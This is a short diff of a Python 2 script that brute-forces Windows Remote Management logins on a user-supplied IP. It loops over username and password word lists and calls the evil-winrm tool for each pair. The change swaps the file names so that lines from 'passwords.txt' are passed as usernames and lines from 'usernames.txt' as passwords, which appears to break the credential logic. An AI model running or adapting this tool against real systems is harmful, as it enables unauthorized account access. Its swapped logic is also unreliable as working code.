@@ -9,9 +9,9 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 ip = raw_input("IP Address : ")
 
-with open('usernames') as f1:
+with open('passwords.txt') as f1:
 	for line1 in f1:
-		with open('passwords') as f2:
+		with open('usernames.txt') as f2:
 			for line2 in f2:
 				print "testing "+line1.rstrip()+":"+ line2.rstrip()
 				r = subprocess.call(["/usr/bin/ruby", "/opt/evil-winrm/evil-winrm.rb",  "-i", ip, "-u", line1.rstrip(), "-p", line2.rstrip()])
